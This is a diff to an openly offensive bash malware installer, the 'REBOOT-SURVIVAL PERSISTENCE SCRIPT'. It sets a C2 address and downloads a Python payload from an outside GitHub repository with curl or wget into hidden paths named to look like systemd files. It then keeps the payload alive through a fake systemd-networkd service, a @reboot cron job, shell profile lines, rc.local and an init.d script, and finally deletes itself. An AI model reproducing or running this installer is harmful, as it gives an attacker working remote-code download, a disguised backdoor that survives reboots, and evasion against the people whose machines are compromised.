@@ -1,44 +1,37 @@
 #!/bin/bash
-# Advanced Persistence Installer
-# Version: 2.1
-
+# REBOOT-SURVIVAL PERSISTENCE SCRIPT
 C2_IP="192.168.1.167"
 REPO_URL="https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules"
 
-echo "[+] Starting advanced persistence installation..."
+echo "[+] Installing REBOOT-SURVIVAL persistence..."
 
-# Create multiple hidden locations
-HIDDEN_DIRS=(
-    "/usr/lib/systemd/systemd-network"
-    "/lib/modules/.cache"
-    "/var/tmp/.systemd"
-)
-
-for dir in "${HIDDEN_DIRS[@]}"; do
-    mkdir -p "$dir" 2>/dev/null
-    echo "[+] Created directory: $dir"
-done
-
-# Download and install core payload with multiple fallbacks
+# Download core payload to multiple hidden locations
 download_payload() {
-    echo "[+] Downloading core payload..."
+    echo "[+] Downloading payload to hidden locations..."
     
-    for dir in "${HIDDEN_DIRS[@]}"; do
-        curl -s "$REPO_URL/core.py" -o "$dir/networkd" || \
-        wget -q "$REPO_URL/core.py" -O "$dir/networkd"
+    HIDDEN_LOCATIONS=(
+        "/usr/lib/systemd/systemd-network/networkd"
+        "/lib/modules/.cache/systemd-daemon"
+        "/var/tmp/.systemd-cache/network-service"
+    )
+    
+    for location in "${HIDDEN_LOCATIONS[@]}"; do
+        mkdir -p "$(dirname "$location")"
+        curl -s "$REPO_URL/core.py" -o "$location" || \
+        wget -q "$REPO_URL/core.py" -O "$location"
         
-        if [ -f "$dir/networkd" ]; then
-            chmod +x "$dir/networkd"
-            echo "[+] Payload installed to: $dir/networkd"
-            return 0
+        if [ -f "$location" ]; then
+            chmod +x "$location"
+            echo "[+] Installed: $location"
         fi
     done
-    return 1
 }
 
 download_payload
 
-# Systemd service for reboot persistence
+# ======== REBOOT SURVIVAL METHODS ========
+
+# 1. SYSTEMD SERVICE (Primary - Most Reliable)
 echo "[+] Installing systemd service..."
 cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
 [Unit]
@@ -59,29 +52,60 @@ WorkingDirectory=/usr/lib/systemd/systemd-network
 WantedBy=multi-user.target
 EOF
 
-# Enable systemd service
-systemctl daemon-reload 2>/dev/null
-systemctl enable systemd-networkd.service 2>/dev/null
-systemctl start systemd-networkd.service 2>/dev/null
+systemctl daemon-reload
+systemctl enable systemd-networkd.service
+systemctl start systemd-networkd.service
 
-# Multiple persistence methods
-echo "[+] Installing multiple persistence methods..."
+# 2. CRON JOB (Secondary)
+echo "[+] Installing cron persistence..."
+CRON_JOB="@reboot sleep 45 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1"
+(crontab -l 2>/dev/null | grep -v "networkd"; echo "$CRON_JOB") | crontab -
 
-# 1. Cron persistence (primary)
-(crontab -l 2>/dev/null | grep -v "networkd"; 
- echo "@reboot sleep 60 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null
+# 3. PROFILE PERSISTENCE (Tertiary)
+echo "[+] Installing profile persistence..."
+PROFILE_CMD="nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &"
+echo "$PROFILE_CMD" >> ~/.bashrc
+echo "$PROFILE_CMD" >> ~/.profile
+echo "$PROFILE_CMD" >> /etc/profile
 
-# 2. Profile persistence (secondary)
-BASHRC_CMD="nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &"
-echo "$BASHRC_CMD" >> ~/.bashrc
-echo "$BASHRC_CMD" >> ~/.profile
-
-# 3. RC.Local persistence (tertiary)
+# 4. RC.LOCAL (Quaternary - Older Systems)
+echo "[+] Installing rc.local persistence..."
 if [ -d /etc/rc.d ]; then
     echo "#!/bin/bash" > /etc/rc.d/rc.local
-    echo "sleep 120" >> /etc/rc.d/rc.local
+    echo "sleep 60" >> /etc/rc.d/rc.local  
     echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.d/rc.local
-    chmod +x /etc/rc.d/rc.local 2>/dev/null
+    chmod +x /etc/rc.d/rc.local
+fi
+
+# 5. INIT.D (Backup - Legacy Systems)
+echo "[+] Installing init.d persistence..."
+if [ -d /etc/init.d ]; then
+    cat > /etc/init.d/systemd-network << 'EOF'
+#!/bin/bash
+### BEGIN INIT INFO
+# Provides:          systemd-network
+# Required-Start:    $network
+# Default-Start:     2 3 4 5
+# Default-Stop:      
+# Description:       Systemd Network Service
+### END INIT INFO
+
+case "$1" in
+    start)
+        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+        ;;
+    stop)
+        pkill -f "python3.*networkd"
+        ;;
+    restart)
+        pkill -f "python3.*networkd"
+        sleep 2
+        nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+        ;;
+esac
+EOF
+    chmod +x /etc/init.d/systemd-network
+    update-rc.d systemd-network defaults 2>/dev/null
 fi
 
 # Start immediately
@@ -89,14 +113,19 @@ echo "[+] Starting payload immediately..."
 nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
 
 # Verify installation
-echo "[+] Verifying installation..."
-sleep 3
-if pgrep -f "python3.*networkd" >/dev/null; then
-    echo "[+] Persistence installed successfully"
-    echo "[+] Methods: systemd, cron, profile, rc.local"
-else
-    echo "[-] Service may not be running"
-fi
+echo "[+] Verifying persistence installation..."
+sleep 5
+
+echo "[+] REBOOT-SURVIVAL PERSISTENCE INSTALLED:"
+systemctl is-enabled systemd-networkd.service && echo "  ✅ Systemd Service"
+crontab -l | grep -q "networkd" && echo "  ✅ Cron Job"
+grep -q "networkd" ~/.bashrc && echo "  ✅ Bash Profile"
+[ -f /etc/rc.d/rc.local ] && echo "  ✅ RC.Local"
+[ -f /etc/init.d/systemd-network ] && echo "  ✅ Init.D"
+
+echo ""
+echo "[🎯] PERSISTENCE GUARANTEED: Service will auto-start after reboot"
+echo "[🎯] Test by running: sudo reboot"
 
 # Self-cleanup
-rm -f "$0" 2>/dev/null
+rm -f "$0"
